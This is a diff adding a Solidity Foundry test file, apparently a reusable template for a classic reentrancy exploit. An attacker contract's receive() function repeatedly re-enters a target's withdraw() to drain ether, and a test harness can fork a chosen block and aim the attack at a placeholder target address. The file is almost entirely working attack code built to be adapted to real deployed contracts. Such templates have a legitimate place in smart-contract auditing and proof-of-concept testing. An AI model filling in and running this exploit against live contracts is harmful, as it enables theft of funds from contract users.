@@ -1,0 +1,73 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// Template: Classic reentrancy attack
+// Adapt:
+//   - TARGET_ADDRESS — vulnerable contract
+//   - VULNERABLE_FUNCTION — function with reentrancy
+//   - FORK_BLOCK — block at which to fork
+
+import "forge-std/Test.sol";
+
+interface ITarget {
+    // TODO: declare vulnerable function
+    function withdraw(uint256 amount) external;
+    function deposit() external payable;
+    function balanceOf(address user) external view returns (uint256);
+}
+
+contract ReentrancyAttacker {
+    ITarget public target;
+    uint256 public iterations;
+    uint256 public maxIterations = 5;
+
+    constructor(ITarget _target) payable {
+        target = _target;
+    }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (iterations < maxIterations) {
+            iterations++;
+            target.withdraw(1 ether);
+        }
+    }
+}
+
+contract ReentrancyExploit is Test {
+    address constant TARGET_ADDRESS = address(0); // TODO
+    uint256 constant FORK_BLOCK = 0; // TODO
+
+    ITarget public target;
+    ReentrancyAttacker public attacker;
+    address public alice = makeAddr("alice");
+
+    function setUp() public {
+        if (FORK_BLOCK > 0) {
+            vm.createSelectFork(vm.envString("RPC_URL"), FORK_BLOCK);
+        }
+        target = ITarget(TARGET_ADDRESS);
+        attacker = new ReentrancyAttacker(target);
+        vm.deal(address(attacker), 10 ether);
+    }
+
+    function test_Exploit_Reentrancy() public {
+        uint256 targetBalanceBefore = address(target).balance;
+        console.log("Target balance before:", targetBalanceBefore);
+
+        attacker.attack{value: 1 ether}();
+
+        uint256 attackerBalance = address(attacker).balance;
+        uint256 targetBalanceAfter = address(target).balance;
+
+        console.log("Target balance after:", targetBalanceAfter);
+        console.log("Attacker balance:", attackerBalance);
+
+        // If exploit successful, attacker drained more than deposited
+        assertGt(attackerBalance, 1 ether, "Reentrancy not successful");
+    }
+}
